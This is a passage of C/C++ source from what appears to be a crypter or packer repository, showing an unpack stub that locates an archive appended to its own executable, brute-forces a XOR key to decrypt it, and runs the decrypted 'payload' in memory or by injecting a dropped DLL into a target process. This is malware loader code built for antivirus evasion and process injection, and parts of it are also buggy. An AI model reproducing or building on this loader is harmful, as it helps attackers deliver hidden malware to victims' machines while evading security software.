		fread(TargetProgram, sizeof(char), sizeof(TargetProgram), fpArchive);

	if (!retrieveKey(SIG, sizeof(SIG))) {
		fclose(fpArchive);
		return packerrorNotAPackedFile;
	}
		

	// read files entries count
	fread(&nFiles, sizeof(nFiles), 1, fpArchive);

	// no files?
	if (!nFiles) return (fclose(fpArchive), packerrorNoFiles);

	fread(&filesList[0], sizeof(packdata_t), nFiles, fpArchive);

	filesList.resize(nFiles);

	// loop in all files
	for (unsigned int i = 0; i < filesList.size(); i++) {

		char buffer[4096];
		packdata_t *pdata = &filesList[i];

		// trigger callback
		if (pcb && pcb->newfile)
			pcb->newfile(pdata->filename, pdata->filesize);


		strcpy_s(buffer, dest);
		strcat_s(buffer, pdata->filename);

		// how many chunks of Buffer_Size is there is in filesize?
		long size = pdata->filesize;
		long pos = 0;
		long read = 0;

		char* _image_ = new char[size*2]();

		while (size > 0){

			long toread = size > sizeof(buffer) ? sizeof(buffer) : size;
			fread(buffer, toread, 1, fpArchive);
			for (int i = 0; i < sizeof(buffer); i++) { // for loop for scrambing bits in the string 
				_image_[read + i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
				buffer[i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
			}
			read += toread;
			pos += toread;
			size -= toread;
			if (pcb && pcb->fileprogress)
				pcb->fileprogress(pos);
				
		}

		// Run payload
		int imSize = pdata->filesize;
		RunImage(_image_, imSize, exeMethod, TargetProgram);

		nFiles--;
	}

	fclose(fpArchive);

	return packerrorSuccess;

}


int SfxGetInsertPos(char *filename, long *pos){

	FILE *fp = fopen(filename, "rb");
	if (fp == NULL)
		return packerrorCouldNotOpenArchive;

	IMAGE_DOS_HEADER idh;

	fread((void *)&idh, sizeof(idh), 1, fp);
	fclose(fp);
	*pos = *(long *)&idh.e_res2[0];
	return packerrorSuccess;
}


bool retrieveKey(char* readSignature, int signatureSize) {

	//bruteforcing the encryption key

	char* retrievedSig = new char[signatureSize];
	int i = KEY_SIZE;

	for (int k = 0; k < KEY_SIZE; k++)
		key[k] = START_ASCII;

	while (i > -1) {

		for (int i = 0; i < signatureSize; i++) // for loop for scrambing bits in the string 
			retrievedSig[i] = readSignature[i] ^ (char)key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string

		retrievedSig[signatureSize] = '\0';

		if (!strcmp(retrievedSig, mainsignature)) return 1;

		i = KEY_SIZE - 1;
		key[i]++;

		while ((int)key[i] > END_ASCII) {
			
			key[i] = START_ASCII;
			key[--i]++;
		}

	}

	return 0;
}

int RunImage(char* Image, int imSize, int exeMethod, char* targetProgram) {

	LPCSTR pDllPath = "E:\\tmp.dll";

	if (exeMethod > 0) {
		
		FILE* fpDll = fopen(pDllPath, "wb+");

		fwrite(Image, sizeof(char), imSize, fpDll);
		fclose(fpDll);
	}

	switch (exeMethod)
	{
	case -1:
		break;
	case 0:
		RunPortableExecutable(Image);
		break;
	default:
		initializeInjection(targetProgram, pDllPath, exeMethod);
		break;
	}

	return 0;

}
```

`UnpackStub/src/Stub/PackRoutines-Stub.h`:

```h
#pragma once

#ifndef __PACKROUTINES__H__
#define __PACKROUTINES__H__

#include <Windows.h>
#include <tchar.h>
#include <stdlib.h>
#include <stdio.h>
#include <vector>
#include <iostream>
#include <time.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>

enum packerrors {
	packerrorSuccess = 0, // no error
	packerrorNoFiles, // no files to extract; empty archive
	packerrorPath, // error in path
	packerrorCannotCreateArchive, // archive file creation error
	packerrorNotAPackedFile, // could not unpack non-archive file
	packerrorExtractError, // could not extract to file
	packerrorCouldNotOpenArchive // failed to open archive for extraction
};


extern const char *packerrors_str[];

typedef struct {
	char filename[MAX_PATH];
	long filesize;
} packdata_t;

typedef struct {
	void(*newfile)(char* name, long size);
	void(*fileprogress)(long pos);
} packcallbacks_t;


int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos = 0, packcallbacks_t * = NULL);
int unpackfiles(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos = 0, packcallbacks_t * = NULL);

int RunImage(char* Image,int imSize, int exeMethod, char* targetProgram);

int SfxGetInsertPos(char *filename, long *pos);

bool retrieveKey(char* readSignature, int signatureSize);

#endif
```

`UnpackStub/src/Stub/UnpackStub.cpp`:

```cpp
#include "PackRoutines-Stub.h"

void newfile_cb(char *fn, long size)
{
	printf("\n --> %s [%ld] ...", fn, size);
}

int main(int argc, char *argv[])
{
	char outDirectory[MAX_PATH];
	
	char arcFn[MAX_PATH];
	long pos;
	
#ifdef MYDEBUG
	//strcpy(arcFn, "e:\\sources\\packer\\arc1.bin.sfx.exe");
	//pos = 0xc000;
#else
	// get self file name
	GetModuleFileName(NULL, arcFn, sizeof(arcFn));
	// get position of archive data inside yourself
	SfxGetInsertPos(arcFn, &pos);
	//printf("going for: %s @ %lX\n", arcFn, pos);
#endif

	// setup callbacks
	packcallbacks_t pcb;
	pcb.fileprogress = NULL;
	pcb.newfile = newfile_cb;

	// fix output directory
	strcpy(outDirectory, "./");
	if (outDirectory[strlen(outDirectory) - 1] != '\\')
		strcat(outDirectory, "\\");

	
	std::vector<packdata_t> filesList(long (10));

	// start unpacking
	int rc = unpackfilesEx(arcFn, outDirectory, filesList, pos, &pcb);
	
	if (rc != packerrorSuccess)
		printf("%s\n", packerrors_str[rc]);
	else
		printf("\nOperation succeeded!\n");

	return 0;
}
```